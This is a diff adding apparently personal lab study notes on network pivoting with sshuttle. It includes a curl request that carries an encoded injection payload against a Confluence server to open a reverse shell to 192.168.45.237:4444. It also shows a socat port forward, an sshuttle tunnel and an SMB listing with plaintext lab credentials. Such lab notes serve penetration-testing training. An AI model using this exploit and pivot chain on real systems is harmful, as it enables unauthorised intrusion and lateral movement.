@@ -1,0 +1,25 @@
+Questions
+True or false: in order to run sshuttle, you need root privileges on the SSH client machine.
+True
+
+Using sshuttle
+# sshuttle is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3 on the SSH server, so it's not always the most lightweight option. In the appropriate scenario, however, it can be very useful.
+
+#  we can set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN interface and forwarding to port 22 on PGDATABASE01.
+
+#Setup MSFConsole to listen port 4444
+curl -v http://192.168.180.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.237/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Upgrade to fully interactive
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2233,fork TCP:10.4.180.215:22
+
+# Then run the sshuttle specifying the SSH connection string we want to use
+sshuttle -r database_admin@192.168.180.63:2233 10.4.180.0/24 172.16.180.0/24
+password: sqlpass123
+
+# Now we will no longer receive any output from sshuttle.. in theory, it should have setup the routing on Kali Machine
+smbclient -L //172.16.180.217/ -U hr_admin --password=Welcome1234
+
+
